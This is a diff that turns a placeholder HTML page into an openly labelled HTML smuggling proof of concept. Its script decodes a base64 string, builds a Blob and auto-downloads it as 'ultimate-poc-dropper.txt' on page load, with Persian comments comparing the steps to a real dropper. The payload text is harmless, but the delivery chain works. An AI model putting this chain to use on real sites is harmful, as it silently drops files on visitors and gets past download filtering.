@@ -1,9 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC Test</title>
-  </head>
-  <body>
-    <h1>PoC is working!</h1>
-  </body>
+<head>
+<meta charset="UTF-8">
+<title>Ultimate HTML Smuggling PoC</title>
+</head>
+<body>
+<h2>Ultimate HTML Smuggling PoC</h2>
+<p>This simulates a high‑impact HTML Smuggling chain.</p>
+
+<script>
+// این متن مثل یک "payload رمز شده" رفتار می‌کند (ولی در واقع بی‌خطر است)
+const encoded = 
+  "UG9DIEZpbGUgR2VuZXJhdGVkIFdpdGggSFRNTCBTbXVnZ2xpbmcKCg0K"+"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGhpcyBpcyBhIFBPRyBmaWxlLCBub3QgYSBtYWx3YXJlLg0K"+
+  "SXQgcmVwcmVzZW50cyBhIHNhZmUsIGhpZ2gtaW1wYWN0IGZpbGUgZGVsaXZlcmVkIHRvIHRoZSB1c2VyLg0K"+
+  "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpFbmxvaiB0byB2ZXJpZnkgeW91ciBIVE1MIFNtdWdnbGluZyBwYXRoIGlzIHdvcmtpbmcu";
+
+// دیکد مثل dropper واقعی
+const payload = atob(encoded);
+
+// ساخت Blob مثل یک فایل بدساخت
+const blob = new Blob([payload], { type: "application/octet-stream" });
+const url = URL.createObjectURL(blob);
+
+// ساخت لینک دانلود
+const a = document.createElement("a");
+a.href = url;
+a.download = "ultimate-poc-dropper.txt";
+document.body.appendChild(a);
+
+// اجرای دانلود اتوماتیک = Smuggling کامل
+a.click();
+</script>
+
+</body>
 </html>
